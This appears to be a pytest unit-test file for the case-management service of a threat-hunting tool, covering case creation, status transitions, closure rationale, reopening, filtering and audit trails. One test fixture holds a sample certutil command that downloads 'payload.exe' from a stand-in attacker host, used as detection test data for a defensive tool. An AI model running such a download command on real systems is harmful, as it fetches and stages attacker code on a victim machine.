"""Unit tests for Investigation Case Management Service.

Tests:
- Case creation and retrieval.
- Valid status lifecycle transitions (OPEN -> INVESTIGATING -> CLOSED -> REOPEN).
- Prevention of invalid status transitions and arbitrary status strings.
- Mandatory disposition rationale on case closure.
- Case reopening with documented rationale and audit trails.
- Case listing and multi-criteria filtering.
- Case detail updates preserving complete audit history.
- Creation with initial finding attachment.
- Transaction rollback guarantees on constraint violation.
"""

from datetime import datetime, timezone
import pytest
from sqlalchemy.orm import Session

from tracehunt.exceptions import CaseManagementError
from tracehunt.investigation.audit_service import get_case_audit_trail
from tracehunt.investigation.case_service import (
    close_investigation,
    create_investigation,
    get_investigation,
    list_investigations,
    reopen_investigation,
    transition_case_status,
    update_investigation,
)
from tracehunt.models import EndpointEvent, Finding


def _setup_finding(session: Session, host: str = "WKSTN-SEC01") -> Finding:
    ev = EndpointEvent(
        host=host,
        event_time=datetime(2026, 3, 30, 10, 0, 0, tzinfo=timezone.utc),
        event_id=1,
        event_type="PROCESS_CREATE",
        process_id=2020,
        image=r"C:\Windows\System32\certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil.com/payload.exe",
    )
    session.add(ev)
    session.flush()

    finding = Finding(
        rule_id="RULE-001-LOLBIN",
        endpoint_event_id=ev.id,
        severity="HIGH",
        confidence="HIGH",
        rationale="Certutil suspicious download flag detected",
        matched_fields={"command_line": ev.command_line},
    )
    session.add(finding)
    session.flush()
    return finding


def test_create_and_retrieve_investigation(test_session: Session) -> None:
    """Verify creating an investigation generates an ID, sets default status OPEN, and records audit entry."""
    case = create_investigation(
        session=test_session,
        title="Suspicious Certutil Execution on Host",
        host="WKSTN-SEC01",
        summary="Analyst investigation of suspicious download",
        reviewer="lead_analyst",
    )

    assert case.id.startswith("INV-")
    assert case.status == "OPEN"
    assert case.host == "WKSTN-SEC01"
    assert case.title == "Suspicious Certutil Execution on Host"

    # Retrieve case
    retrieved = get_investigation(test_session, case.id)
    assert retrieved is not None
    assert retrieved.id == case.id
    assert retrieved.status == "OPEN"

    # Audit trail verification
    audit_trail = get_case_audit_trail(case.id, test_session)
    assert len(audit_trail) == 1
    assert audit_trail[0].action == "CASE_CREATED"
    assert audit_trail[0].reviewer == "lead_analyst"
    assert audit_trail[0].new_status == "OPEN"


def test_create_investigation_validation(test_session: Session) -> None:
    """Verify validation rejects empty title, empty host, invalid initial status, or duplicate ID."""
    with pytest.raises(CaseManagementError, match="title must not be empty"):
        create_investigation(test_session, title="", host="HOST-01")

    with pytest.raises(CaseManagementError, match="host must not be empty"):
        create_investigation(test_session, title="Title", host="   ")

    with pytest.raises(CaseManagementError, match="Invalid initial status"):
        create_investigation(test_session, title="Title", host="HOST-01", initial_status="UNKNOWN")

    # Duplicate ID rejection
    create_investigation(test_session, title="T1", host="H1", investigation_id="INV-CUSTOM-001")
    with pytest.raises(CaseManagementError, match="already exists"):
        create_investigation(test_session, title="T2", host="H2", investigation_id="INV-CUSTOM-001")


def test_valid_status_lifecycle_transitions(test_session: Session) -> None:
    """Test full valid lifecycle: OPEN -> INVESTIGATING -> CLOSED_TRUE_POSITIVE -> OPEN (reopen)."""
    case = create_investigation(test_session, title="Lifecycle Case", host="SRV-01")
    assert case.status == "OPEN"

    # 1. OPEN -> INVESTIGATING
    transition_case_status(
        test_session,
        case.id,
        new_status="INVESTIGATING",
        reviewer="hunter1",
        rationale="Starting deep dive on parent process tree",
    )
    assert case.status == "INVESTIGATING"

    # 2. INVESTIGATING -> CLOSED_TRUE_POSITIVE
    close_investigation(
        test_session,
        case.id,
        disposition="TRUE_POSITIVE",
        reviewer="hunter1",
        rationale="Confirmed malicious payload staging by user alice",
    )
    assert case.status == "CLOSED_TRUE_POSITIVE"

    # 3. CLOSED_TRUE_POSITIVE -> OPEN (Reopen)
    reopen_investigation(
        test_session,
        case.id,
        reviewer="senior_lead",
        rationale="New telemetry arrived showing lateral movement to SRV-02",
    )
    assert case.status == "OPEN"

    # Audit records count: CREATED, STATUS_CHANGED, CASE_CLOSED, CASE_REOPENED
    trail = get_case_audit_trail(case.id, test_session)
    assert len(trail) == 4
    actions = [a.action for a in trail]
    assert actions == ["CASE_CREATED", "STATUS_CHANGED", "CASE_CLOSED", "CASE_REOPENED"]


def test_invalid_status_transitions_and_closure_rationale_enforcement(test_session: Session) -> None:
    """Verify that invalid status jumps, missing closure rationale, and arbitrary statuses are blocked."""
    case = create_investigation(test_session, title="Invalid Transitions Case", host="SRV-01")

    # Arbitrary status string
    with pytest.raises(CaseManagementError, match="Invalid target status 'PENDING_REVIEW'"):
        transition_case_status(test_session, case.id, new_status="PENDING_REVIEW")

    # Closing without rationale must be rejected
    with pytest.raises(CaseManagementError, match="Disposition rationale is required"):
        close_investigation(test_session, case.id, disposition="FALSE_POSITIVE", rationale="   ")

    # Close properly
    close_investigation(
        test_session,
        case.id,
        disposition="CLOSED_FALSE_POSITIVE",
        rationale="Verified legitimate admin maintenance script",
    )
    assert case.status == "CLOSED_FALSE_POSITIVE"

    # Direct transition from CLOSED_FALSE_POSITIVE to CLOSED_TRUE_POSITIVE without reopening is prohibited
    with pytest.raises(CaseManagementError, match="Invalid status transition"):
        transition_case_status(
            test_session,
            case.id,
            new_status="CLOSED_TRUE_POSITIVE",
            rationale="Trying to switch closed state directly",
        )

    # Reopening without rationale is prohibited
    with pytest.raises(CaseManagementError, match="Rationale is required when reopening"):
        reopen_investigation(test_session, case.id, rationale="")


def test_list_and_filter_investigations(test_session: Session) -> None:
    """Verify listing and filtering cases by status, host, and timestamps."""
    create_investigation(test_session, title="Open Case 1", host="WKSTN-A", initial_status="OPEN")
    create_investigation(test_session, title="Open Case 2", host="WKSTN-B", initial_status="OPEN")
    c3 = create_investigation(test_session, title="Investigating Case", host="WKSTN-A")
    transition_case_status(test_session, c3.id, "INVESTIGATING", rationale="Analysis started")

    # Filter by status="OPEN"
    open_cases = list_investigations(test_session, status="OPEN")
    assert len(open_cases) == 2
    assert all(c.status == "OPEN" for c in open_cases)

    # Filter by host="WKSTN-A"
    host_a_cases = list_investigations(test_session, host="WKSTN-A")
    assert len(host_a_cases) == 2

    # Filter by invalid status raises error
    with pytest.raises(CaseManagementError, match="Invalid filter status"):
        list_investigations(test_session, status="NONEXISTENT")


def test_update_investigation_details_and_audit(test_session: Session) -> None:
    """Verify updating title/summary preserves case ID and appends audit log without losing history."""
    case = create_investigation(test_session, title="Initial Title", host="WKSTN-01")
    assert len(get_case_audit_trail(case.id, test_session)) == 1

    updated = update_investigation(
        test_session,
        case.id,
        title="Updated High Severity Alert Title",
        summary="Discovered additional LOLBIN executions",
        reviewer="analyst_2",
    )
    assert updated.title == "Updated High Severity Alert Title"
    assert updated.summary == "Discovered additional LOLBIN executions"

    # Verify audit history
    trail = get_case_audit_trail(case.id, test_session)
    assert len(trail) == 2
    assert trail[1].action == "CASE_UPDATED"
    assert trail[1].reviewer == "analyst_2"
    assert "Title changed" in trail[1].comment
    assert "Summary updated" in trail[1].comment


def test_create_case_with_initial_findings(test_session: Session) -> None:
    """Verify creating a case with initial finding IDs attaches evidence immediately."""
    finding = _setup_finding(test_session, host="WKSTN-01")

    case = create_investigation(
        test_session,
        title="Initial Finding Case",
        host="WKSTN-01",
        initial_finding_ids=[finding.id],
    )

    retrieved = get_investigation(test_session, case.id)
    assert retrieved is not None
    assert len(retrieved.evidence_items) == 1
    assert retrieved.evidence_items[0].finding_id == finding.id
    assert retrieved.evidence_items[0].sequence_number == 1
